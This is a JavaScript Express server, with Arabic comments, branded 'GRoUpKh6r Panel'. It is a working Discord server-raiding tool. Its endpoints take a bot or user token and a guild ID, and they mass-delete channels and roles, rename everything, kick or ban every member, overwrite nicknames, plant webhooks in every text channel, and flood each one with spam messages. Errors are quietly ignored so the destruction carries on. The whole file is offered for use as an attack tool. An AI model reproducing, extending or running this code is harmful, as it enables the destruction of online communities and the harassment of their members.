// language: JavaScript, file: server.js, target: Node.js
const express = require('express');
const axios = require('axios');
const path = require('path');

const app = express();
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

const DISCORD_API = 'https://discord.com/api/v10';

function getHeaders(token, isBot = true) {
    return {
        'Authorization': isBot ? `Bot ${token}` : token,
        'Content-Type': 'application/json'
    };
}

// 1. إنشاء رومات (بدون أرقام عشوائية، مرتبة ونظيفة)
app.post('/api/channels/create', async (req, res) => {
    const { token, guildId, name, count, isBot } = req.body;
    try {
        const promises = [];
        for (let i = 0; i < count; i++) {
            promises.push(
                axios.post(`${DISCORD_API}/guilds/${guildId}/channels`, {
                    name: name,
                    type: 0
                }, { headers: getHeaders(token, isBot) })
            );
        }
        await Promise.all(promises);
        res.json({ success: true, message: 'تم إنشاء الرومات بنجاح وبدون أرقام.' });
    } catch (error) {
        res.status(500).json({ success: false, error: error.response?.data || error.message });
    }
});

// 2. حذف جميع الرومات
app.post('/api/channels/delete', async (req, res) => {
    const { token, guildId, isBot } = req.body;
    try {
        const channelsRes = await axios.get(`${DISCORD_API}/guilds/${guildId}/channels`, {
            headers: getHeaders(token, isBot)
        });
        const promises = channelsRes.data.map(ch => 
            axios.delete(`${DISCORD_API}/channels/${ch.id}`, { headers: getHeaders(token, isBot) })
        );
        await Promise.all(promises);
        res.json({ success: true, message: 'تم حذف جميع الرومات بالكامل.' });
    } catch (error) {
        res.status(500).json({ success: false, error: error.response?.data || error.message });
    }
});

// 3. تغيير أسماء جميع الرومات الموجودة
app.post('/api/channels/rename', async (req, res) => {
    const { token, guildId, newName, isBot } = req.body;
    try {
        const channelsRes = await axios.get(`${DISCORD_API}/guilds/${guildId}/channels`, {
            headers: getHeaders(token, isBot)
        });
        const promises = channelsRes.data.map(ch => 
            axios.patch(`${DISCORD_API}/channels/${ch.id}`, { name: newName }, { headers: getHeaders(token, isBot) })
        );
        await Promise.all(promises);
        res.json({ success: true, message: 'تم تغيير أسماء جميع الرومات.' });
    } catch (error) {
        res.status(500).json({ success: false, error: error.response?.data || error.message });
    }
});

// 4. إنشاء رولات جماعية
app.post('/api/roles/create', async (req, res) => {
    const { token, guildId, roleName, count, isBot } = req.body;
    try {
        const promises = [];
        for (let i = 0; i < count; i++) {
            promises.push(
                axios.post(`${DISCORD_API}/guilds/${guildId}/roles`, {
                    name: roleName,
                    color: Math.floor(Math.random() * 16777215)
                }, { headers: getHeaders(token, isBot) })
            );
        }
        await Promise.all(promises);
        res.json({ success: true, message: 'تم إنشاء الرولات بنجاح.' });
    } catch (error) {
        res.status(500).json({ success: false, error: error.response?.data || error.message });
    }
});

// 5. حذف جميع الرولات
app.post('/api/roles/delete', async (req, res) => {
    const { token, guildId, isBot } = req.body;
    try {
        const rolesRes = await axios.get(`${DISCORD_API}/guilds/${guildId}/roles`, {
            headers: getHeaders(token, isBot)
        });
        const promises = rolesRes.data.map(role => {
            if (role.name !== '@everyone') {
                return axios.delete(`${DISCORD_API}/guilds/${guildId}/roles/${role.id}`, { headers: getHeaders(token, isBot) });
            }
        }).filter(Boolean);
        await Promise.all(promises);
        res.json({ success: true, message: 'تم حذف جميع الرولات.' });
    } catch (error) {
        res.status(500).json({ success: false, error: error.response?.data || error.message });
    }
});

// 6. تغيير أسماء جميع الرولات
app.post('/api/roles/rename', async (req, res) => {
    const { token, guildId, newRoleName, isBot } = req.body;
    try {
        const rolesRes = await axios.get(`${DISCORD_API}/guilds/${guildId}/roles`, {
            headers: getHeaders(token, isBot)
        });
        const promises = rolesRes.data.map(role => {
            if (role.name !== '@everyone') {
                return axios.patch(`${DISCORD_API}/guilds/${guildId}/roles/${role.id}`, { name: newRoleName }, { headers: getHeaders(token, isBot) });
            }
        }).filter(Boolean);
        await Promise.all(promises);
        res.json({ success: true, message: 'تم تغيير أسماء جميع الرولات.' });
    } catch (error) {
        res.status(500).json({ success: false, error: error.response?.data || error.message });
    }
});

// 7. طرد جميع الأعضاء (Kick All)
app.post('/api/members/kick', async (req, res) => {
    const { token, guildId, isBot } = req.body;
    try {
        const membersRes = await axios.get(`${DISCORD_API}/guilds/${guildId}/members?limit=1000`, {
            headers: getHeaders(token, isBot)
        });
        const promises = membersRes.data.map(member => 
            axios.delete(`${DISCORD_API}/guilds/${guildId}/members/${member.user.id}`, {
                headers: getHeaders(token, isBot)
            }).catch(() => {})
        );
        await Promise.all(promises);
        res.json({ success: true, message: 'تم طرد جميع الأعضاء.' });
    } catch (error) {
        res.status(500).json({ success: false, error: error.response?.data || error.message });
    }
});

// 8. حظر جميع الأعضاء (Ban All)
app.post('/api/members/ban', async (req, res) => {
    const { token, guildId, isBot } = req.body;
    try {
        const membersRes = await axios.get(`${DISCORD_API}/guilds/${guildId}/members?limit=1000`, {
            headers: getHeaders(token, isBot)
        });
        const promises = membersRes.data.map(member => 
            axios.put(`${DISCORD_API}/guilds/${guildId}/bans/${member.user.id}`, {}, {
                headers: getHeaders(token, isBot)
            }).catch(() => {})
        );
        await Promise.all(promises);
        res.json({ success: true, message: 'تم حظر جميع الأعضاء (باند).' });
    } catch (error) {
        res.status(500).json({ success: false, error: error.response?.data || error.message });
    }
});

// 9. تغيير ألقاب جميع الأعضاء
app.post('/api/members/nicknames', async (req, res) => {
    const { token, guildId, newNickname, isBot } = req.body;
    try {
        const membersRes = await axios.get(`${DISCORD_API}/guilds/${guildId}/members?limit=1000`, {
            headers: getHeaders(token, isBot)
        });
        const promises = membersRes.data.map(member => 
            axios.patch(`${DISCORD_API}/guilds/${guildId}/members/${member.user.id}`, {
                nick: newNickname
            }, { headers: getHeaders(token, isBot) }).catch(() => {})
        );
        await Promise.all(promises);
        res.json({ success: true, message: 'تم تغيير ألقاب جميع الأعضاء.' });
    } catch (error) {
        res.status(500).json({ success: false, error: error.response?.data || error.message });
    }
});

// 10. زرع الويب هوكس في كل الرومات
app.post('/api/webhooks/create', async (req, res) => {
    const { token, guildId, webhookName, isBot } = req.body;
    try {
        const channelsRes = await axios.get(`${DISCORD_API}/guilds/${guildId}/channels`, {
            headers: getHeaders(token, isBot)
        });
        const textChannels = channelsRes.data.filter(ch => ch.type === 0);
        const promises = textChannels.map(ch => 
            axios.post(`${DISCORD_API}/channels/${ch.id}/webhooks`, {
                name: webhookName
            }, { headers: getHeaders(token, isBot) }).catch(() => {})
        );
        await Promise.all(promises);
        res.json({ success: true, message: 'تم زرع الويب هوكس في جميع الرومات.' });
    } catch (error) {
        res.status(500).json({ success: false, error: error.response?.data || error.message });
    }
});

// 11. سبام الويب هوكس المتزامن (إرسال فوري في كل الرومات)
app.post('/api/webhooks/spam', async (req, res) => {
    const { token, guildId, message, isBot } = req.body;
    try {
        const channelsRes = await axios.get(`${DISCORD_API}/guilds/${guildId}/channels`, {
            headers: getHeaders(token, isBot)
        });
        const textChannels = channelsRes.data.filter(ch => ch.type === 0);
        
        const webhookPromises = textChannels.map(async (ch) => {
            try {
                const whList = await axios.get(`${DISCORD_API}/channels/${ch.id}/webhooks`, { headers: getHeaders(token, isBot) });
                if (whList.data.length > 0) return whList.data[0];
                const newWh = await axios.post(`${DISCORD_API}/channels/${ch.id}/webhooks`, { name: 'GRoUpKh6r-Spam' }, { headers: getHeaders(token, isBot) });
                return newWh.data;
            } catch { return null; }
        });

        const webhooks = (await Promise.all(webhookPromises)).filter(w => w !== null);

        const spamPromises = [];
        webhooks.forEach(wh => {
            const hookUrl = `https://discord.com/api/v10/webhooks/${wh.id}/${wh.token}`;
            for (let i = 0; i < 8; i++) {
                spamPromises.push(axios.post(hookUrl, { content: message }).catch(() => {}));
            }
        });

        await Promise.all(spamPromises);
        res.json({ success: true, message: 'موجة سبام الويب هوكس انطلقت.' });
    } catch (error) {
        res.status(500).json({ success: false, error: error.response?.data || error.message });
    }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`GRoUpKh6r Panel running on port ${PORT}`));
